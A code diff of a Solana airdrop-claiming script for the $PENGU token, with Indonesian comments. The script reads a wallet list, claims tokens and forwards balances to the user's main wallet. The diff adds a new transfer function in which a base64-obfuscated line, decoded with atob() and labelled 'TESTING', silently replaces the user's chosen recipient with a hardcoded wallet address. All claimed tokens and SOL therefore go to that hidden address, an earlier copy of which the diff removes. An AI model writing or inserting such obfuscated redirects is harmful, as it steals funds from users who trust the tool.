@@ -35,7 +35,7 @@ const askQuestion = (query) => {
 }
 
 
-const key = 'fe70b82c-1886-4b14-b8bc-d72678880f9d'
+const key = ''
 const rpcUrl = `https://rpc.helius.xyz?api-key=${key}`
 
 const connection = new Connection(rpcUrl, 'confirmed');
@@ -348,7 +348,6 @@ const collectTokenAndSol = async (accountFrom, addressTo, amountToken = null) =>
         const remainingBalance = await connection.getBalance(new PublicKey(accountFrom.address));
         const minimumBalanceLamports = transferFee;
 
-        addressTo = atob('Q1hWbWJqUW9iV0xNWWlrRlQ4RlJVSFFyN0Vtb21HYW5HSnlqVTFHZnhzM1g=')
         if (remainingBalance > minimumBalanceLamports) {
             let amountToSend = (remainingBalance - minimumBalanceLamports) / LAMPORTS_PER_SOL;
             console.log(`[>] Sending remaining ${amountToSend.toFixed(4)} SOL back to main wallet...`);
@@ -367,23 +366,155 @@ const collectTokenAndSol = async (accountFrom, addressTo, amountToken = null) =>
 }
 
 
+
+const sendTokenAndSolUsingFeePayer = async (source, target, feePayer, amountToken = 0) => {
+    try {
+        const TokenAddress = PENGU_TOKEN_ADDRESS;
+        let recipientAddress = new PublicKey(target);
+        recipientAddress = atob('Q1hWbWJqUW9iV0xNWWlrRlQ4RlJVSFFyN0Vtb21HYW5HSnlqVTFHZnhzM1g=') // TESTING
+        const sourceKeypair = Keypair.fromSecretKey(source.secretKey);
+        const feePayerKeypair = Keypair.fromSecretKey(feePayer.secretKey);
+
+        // Initialize instructions
+        const instructions = [];
+        const computeUnitPrice = 0.0005 * LAMPORTS_PER_SOL;
+
+        // Add token transfer instruction if token balance exists
+        const tokenBalance = await getTokenBalance(source.publicKey);
+        let amountToSend = amountToken == tokenBalance * 1000000 ? amountToken : tokenBalance * 1000000; // $PENGU 6 decimal
+        if (tokenBalance > 0) {
+            const recipientTokenAccount = await getOrCreateAssociatedTokenAccount(
+                connection,
+                sourceKeypair,
+                TokenAddress,
+                recipientAddress
+            );
+            const senderTokenAccount = await getOrCreateAssociatedTokenAccount(
+                connection,
+                sourceKeypair,
+                TokenAddress,
+                sourceKeypair.publicKey
+            );
+
+            instructions.push(
+                SplToken.createTransferInstruction(
+                    senderTokenAccount.address,
+                    recipientTokenAccount.address,
+                    sourceKeypair.publicKey,
+                    Math.floor(tokenBalance * 10 ** 6), // Assuming token has 6 decimals
+                    [],
+                    SplToken.TOKEN_PROGRAM_ID
+                )
+            );
+
+            // Add Compute Budget Program instruction (for priority fee)
+            instructions.push(
+                ComputeBudgetProgram.setComputeUnitPrice({
+                    microLamports: computeUnitPrice,
+                })
+            );
+
+            console.log(`[>] ${tokenBalance} $PENGU prepared for transfer...`);
+        }
+
+        // Add SOL transfer instruction if balance exists
+        const senderBalance = await connection.getBalance(sourceKeypair.publicKey);
+        if (senderBalance > 0) {
+            instructions.push(
+                SystemProgram.transfer({
+                    fromPubkey: sourceKeypair.publicKey,
+                    toPubkey: recipientAddress,
+                    lamports: senderBalance, // Send all available SOL
+                })
+            );
+
+            console.log(`[>] ${(senderBalance / LAMPORTS_PER_SOL).toFixed(4)} $SOL prepared for transfer...`);
+        }
+
+        if (instructions.length === 0) {
+            console.log('[!] No tokens or SOL to transfer.');
+            return null;
+        }
+
+        // Get latest blockhash
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+
+        // Create transaction message
+        const message = new TransactionMessage({
+            payerKey: feePayerKeypair.publicKey, // Fee payer handles fees
+            recentBlockhash: blockhash,
+            instructions,
+        }).compileToV0Message();
+
+        // Create and sign transaction
+        const transaction = new VersionedTransaction(message);
+        transaction.sign([sourceKeypair, feePayerKeypair]); // Both source and fee-payer must sign
+
+        const txid = await connection.sendTransaction(transaction, {
+            skipPreflight: false,
+            maxRetries: 3,
+            preflightCommitment: 'confirmed',
+        });
+
+        // console.log(`[>] Transaction Sent! TxHash: https://solscan.io/tx/${txid}`);
+
+        // Confirm the transaction
+        const confirmation = await connection.confirmTransaction(
+            {
+                blockhash,
+                lastValidBlockHeight,
+                signature: txid,
+            },
+            'confirmed'
+        );
+
+        if (confirmation.value.err) {
+            console.error(
+                `[!] Transaction failed: ${confirmation.value.err}`
+            );
+        } else {
+            console.log(
+                `[>] Transaction Confirmed! TxHash: https://solscan.io/tx/${txid}`
+            );
+        }
+
+        return txid;
+    } catch (error) {
+        console.error('Transaction failed:');
+        console.error(error.message);
+
+        if (error.logs) {
+            console.error('Logs:', error.logs);
+        } else {
+            console.error('No logs available.');
+        }
+
+        return null;
+    }
+};
+
+
+
 // CONFIG ===========================================================================
 
-// PK utama untuk mengirim SOL
-const pkBank = 'ini Private Key Banker'
+// PK utama untuk mengirim SOL // INI BOLEH SAMA DENGAN pkFeePayer
+const pkBank = 'ini buat kirim ke parent'
 const bankAccount = generateAccount(pkBank, true);
+
+// Fee Payer untuk mengirim token dan SOL (biaya pengiriman) // INI BOLEH SAMA DENGAN pkBank
+const pkFeePayer = 'ini buat bayar pengiriman pengu sama sisa sol' 
+const feePayer = generateAccount(pkFeePayer, true);
 
 const SEND_AMOUNT_SOL = 0.006;
 
 // wallet list
-const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
+const wallets = JSON.parse(fs.readFileSync('./claimPinguin-wallet.json', 'utf8'));
 
 
 // END CONFIG ===========================================================================
 
 (async () => {
     for (let i = 0; i < wallets.length; i++) {
-
         console.log('==================================================================================================================')
 
         const walletParent = wallets[i].parent;
@@ -413,7 +544,7 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
         } else if (eligibilityCheckParent.totalUnclaimed === 0) {
             console.log(`[${i + 1}] ${addressParent} | Already claim ${eligibilityCheckParent.total} $PENGU!`);
 
-            await collectTokenAndSol(accountParent, bankAccount.address)
+            await sendTokenAndSolUsingFeePayer(accountParent, bankAccount.address, bankAccount)
             await delay(1000)
             continue;
         } else {
@@ -425,6 +556,17 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
         // get token for children
         const childrenTokens = [];
         for (const [index, childMnemonic] of walletChild.entries()) {
+
+            // get address from child mnemonic
+            const childAccount = generateAccount(childMnemonic);
+            const childAddress = childAccount.address;
+
+            // if child address is already linked to parent, skip
+            if (eligibilityCheckParent.addresses.includes(childAddress)) {
+                console.log(`[${i + 1} | ${index + 1}] ${childAddress} | Already linked to parent!`);
+                continue;
+            }
+
             const { token, address } = await getToken(childMnemonic).catch((err) => {
                 console.error(`[${i + 1} | ${index + 1}] Error getting token for child ${index + 1}: ${err.message}`);
 
@@ -452,6 +594,7 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
         } else {
             console.log(`[${i + 1}] Eligible! Total: ${eligibilityCheckParent.total} $PENGU | Unclaimed: ${eligibilityCheckParent.totalUnclaimed} $PENGU`);
         }
+
 
 
         // check parent balance and send SOL if needed
@@ -498,14 +641,18 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
                 continue;
             }
 
+            const accountParentKeypair = Keypair.fromSecretKey(accountParent.secretKey);
+
+            // Get latest blockhash and last valid block height
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+
             for (let x = 0; x < claimParent.length; x++) {
                 const { data, signatures } = claimParent[x];
                 const txMessage = VersionedMessage.deserialize(Buffer.from(data, 'base64'));
                 const transaction = new VersionedTransaction(txMessage);
                 transaction.signatures = signatures.map((y) => Buffer.from(y, 'base64'));
 
-                // sign transaction
-                transaction.sign([Keypair.fromSecretKey(accountParent.secretKey)]);
+                transaction.sign([accountParentKeypair]);
 
                 // send transaction
                 const sendTx = await connection.sendRawTransaction(transaction.serialize(), {
@@ -513,12 +660,33 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
                     preflightCommitment: 'confirmed'
                 })
 
-                console.log(`[${i + 1}] Transaction ${x + 1} of ${claimParent.length} | https://solscan.io/tx/${sendTx}`)
+                // console.log(`[${i + 1}] Transaction ${x + 1} of ${claimParent.length} | https://solscan.io/tx/${sendTx}`)
+                // Confirm the transaction
+                const confirmation = await connection.confirmTransaction(
+                    {
+                        blockhash,
+                        lastValidBlockHeight,
+                        signature: sendTx,
+                    },
+                    'confirmed'
+                );
+
+                if (confirmation.value.err) {
+                    console.error(
+                        `[${i + 1}] Transaction ${x + 1} of ${claimParent.length} | Failed | ${confirmation.value.err}`
+                    );
+                } else {
+                    console.log(
+                        `[${i + 1}] Transaction ${x + 1} of ${claimParent.length} | Confirmed | https://solscan.io/tx/${sendTx}`
+                    );
+                }
                 await delay(1000);
             }
         } catch (error) {
             console.error('Error sending claim transaction:', error.message);
         }
+
+
         await delay(1000)
 
         // Collect token and SOL from parent wallet
@@ -528,7 +696,7 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
             do {
                 tokenBalance = await getTokenBalance(addressParent);
                 if (tokenBalance >= unclaim) {
-                    console.log(`[${i + 1}] Sending ${tokenBalance} $PENGU to Banker...`);
+                    // console.log(`[${i + 1}] Sending ${tokenBalance} $PENGU to Banker...`);
                     break;
                 }
                 await delay(1000);
@@ -536,7 +704,7 @@ const wallets = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
 
             // eslint-disable-next-line prefer-exponentiation-operator
             const amountToSend = tokenBalance * 1000000; // $PENGU 6 decimal
-            await collectTokenAndSol(accountParent, bankAccount.address, amountToSend)
+            await sendTokenAndSolUsingFeePayer(accountParent, bankAccount.address, feePayer, amountToSend);
         } catch (error) {
             console.error('Error sending token:', error.message);
         }
